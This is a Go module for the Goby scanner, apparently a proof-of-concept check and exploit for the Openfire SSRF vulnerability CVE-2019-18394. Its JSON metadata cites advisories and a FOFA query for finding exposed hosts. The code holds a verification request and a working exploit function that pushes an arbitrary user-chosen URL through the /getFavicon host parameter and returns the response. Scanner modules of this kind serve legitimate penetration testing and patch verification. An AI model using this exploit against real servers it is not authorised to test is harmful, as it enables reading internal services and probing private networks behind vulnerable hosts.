package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Openfire SSRF (CVE-2019-18394)",
    "Description": "A Server Side Request Forgery (SSRF) vulnerability in FaviconServlet.java in Ignite Realtime Openfire through 4.4.2 allows attackers to send arbitrary HTTP GET requests.",
    "Product": "Openfire < 4.4.3",
    "Homepage": "https://igniterealtime.org/projects/openfire/",
    "DisclosureDate": "2019-10-24",
    "Author": "ovi3",
    "FofaQuery": "app=\"Openfire\"",
    "Level": "2",
    "Impact": "An attacker can force Openfire application to send GET HTTP requests on any host and port with any GET arguments. It is possible to read response from these requests.",
    "Recommendation": "Udpdated to version 4.4.3 or higher",
    "References": null,
    "RealReferences": [
        "https://github.com/igniterealtime/Openfire/pull/1497",
        "https://swarm.ptsecurity.com/openfire-admin-console/",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-18394",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18394"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "url",
            "type": "input",
            "value": "127.0.0.1:9090/index.jsp?"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "SSRF"
    ],
    "CVEIDs": [
        "CVE-2019-18394"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "Openfire"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "6803"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig(fmt.Sprintf("/getFavicon?host=127.0.0.1:%s?", u.Port))
			cfg.VerifyTls = false

			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<meta http-equiv="refresh" content="0;URL=index.jsp">`) {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			connUrl := ss.Params["url"].(string)
			cfg := httpclient.NewGetRequestConfig(fmt.Sprintf("/getFavicon?host=%s", connUrl))
			cfg.VerifyTls = false

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = resp.RawBody
			}

			return expResult
		},
	))
}
